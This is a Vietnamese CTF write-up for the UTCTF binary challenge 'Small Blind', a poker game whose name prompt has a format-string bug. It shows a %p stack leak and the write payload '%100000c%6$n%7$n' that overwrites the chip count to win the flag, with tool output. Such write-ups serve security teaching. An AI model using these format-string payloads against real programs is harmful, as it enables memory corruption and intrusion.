---
title: "UTCTF - Binary exploitation - Small Blind"
date: 2024-01-10 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, format-string, utctf]
author: datious
---
# UTCTF - Binary exploitation - Small Blind
Author: D1n0_09

![image](https://hackmd.io/_uploads/Bk-X3zEq-g.png)

- Đây là 1 challenge đoán cách để crack chuong trình khi đó chương trình sẽ check và đưa ra flag. Dựa vào phần description ta có thể đoán được chỉ khi chuong trình kết thúc và ta có được số chip vượt 1000 thì sẽ win.
1. Lỗ hổng
![image](https://hackmd.io/_uploads/HkmxpGNcbg.png)
- Nhìn vào đây có thể thấy rằng khi nhập %p thì sẽ leak được địa chỉ trên stack. ( Format string).
- Nhập cỡ 29 %p để xem leak được cái gì.

```
(pwnenv)─(kali㉿kali)-[~/Downloads/utctf]
└─$ python3 test.py
[q] Opening connection to challenge.utctf.live on port 7255: Trying 23.139.8[+] Opening connection to challenge.utctf.live on port 7255: Done
[+] Receiving all data: Done (1.27KB)
[*] Closed connection to challenge.utctf.live port 7255
╔══════════════════════════════════════════╗
║          ♣ ♦ Texas Hold'em ♥ ♠           ║
╠══════════════════════════════════════════╣
║  Small blind: 10    Big blind: 20        ║
║  Blinds alternate each hand              ║
║  Starting chips: 500  each               ║
╚══════════════════════════════════════════╝
Welcome to the table, 0x7ffcee825ac0 (nil) (nil) 0x16 0x16 0x7ffcee828218 0x7ffcee82821c 0x7ffcee828230 0x4034c3     (nil)      (nil)       (nil) 0x7ffcee829fe5         (nil) !
Actions: check  |  raise <n>  |  call  |  fold
Raises must be in increments of the big blind (20).


──────────────────────────────────────────
Your chips: 500  |  Dealer chips: 500
Play a hand? (y to play / n to exit / t to toggle Unicode suits [currently on]): Thanks for playing, %0p %1p %2p %3p %4p %5p %6p %7p %8p %9p %10p %11p %12p %13p %14! Final chips: 500

You finished with 500 chips. 
```
- Leak tối đa chỉ được 12 offset trên stack.
- Ta sẽ đoán offset và ghi vào đúng địa chỉ của biến chip nhằm tăng số lượng chip. 
- Sau khi ghi dữ liệu bằng format string tôi đã thay đổi được giá trị ở offset 6(chip của dealer) và 7(chip của player).
- Nhập "%100000c%6$n%7$n" tăng giá trị cho cả 2 cho choáy hihihii.

```
     �!
Actions: check  |  raise <n>  |  call  |  fold
Raises must be in increments of the big blind (20).


──────────────────────────────────────────
Your chips: 100000  |  Dealer chips: 500
Play a hand? (y to play / n to exit / t to toggle Unicode suits [currently on]): n
Thanks for playing, %100000c%7$n! Final chips: 100000

Incredible! You've minted new chips and won the prize: utflag{counting_chars_not_cards}

                         
```
Done !